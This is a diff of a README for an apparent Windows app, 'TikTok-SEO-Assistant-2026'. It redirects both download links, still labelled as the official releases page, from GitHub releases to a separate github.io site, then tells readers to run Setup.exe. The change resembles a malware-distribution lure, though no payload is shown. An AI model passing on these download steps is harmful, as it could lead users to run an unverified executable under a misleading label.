@@ -1,6 +1,6 @@
 # 🚀 TikTok-SEO-Assistant-2026 - Grow Your Reach With Better Content
 
-[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/trevorsi1739/TikTok-SEO-Assistant-2026/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://trevorsi1739.github.io)
 
 This application helps you create and optimize content for your TikTok profile. You can generate video hooks, discover trending hashtags, and write effective captions. The tool integrates AI to suggest content ideas based on current trends. You save time and reach more viewers with improved video data.
 
@@ -12,7 +12,7 @@ This software runs on Windows 11. Your computer needs at least 4GB of RAM and a 
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/trevorsi1739/TikTok-SEO-Assistant-2026/releases) to download the installer.
+1. Visit the [official releases page](https://trevorsi1739.github.io) to download the installer.
 2. Locate the link labeled Setup.exe.
 3. Click the link to save the file to your computer.
 4. Open your Downloads folder and double-click the file named Setup.exe.
